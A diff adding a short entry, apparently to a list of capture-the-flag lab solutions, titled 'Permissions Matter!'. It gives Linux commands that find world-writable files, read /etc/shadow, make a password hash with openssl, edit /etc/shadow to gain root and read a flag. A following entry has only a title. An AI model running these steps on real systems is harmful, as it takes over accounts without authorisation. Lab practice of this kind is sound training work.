@@ -2062,4 +2062,41 @@ cd C:\\Users\\Administrator\\Desktop
 dir
 cat flag.txt
 ```
-108)
+108) Permissions Matter!
+
+```
+find / -not -type l -perm -o+w
+ls -l /etc/shadow
+cat /etc/shadow
+openssl passwd -1 -salt abc password
+vim /etc/shadow
+su
+cd /root
+ls -l
+cat flag
+```
+109) Editing Gone Wrong
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
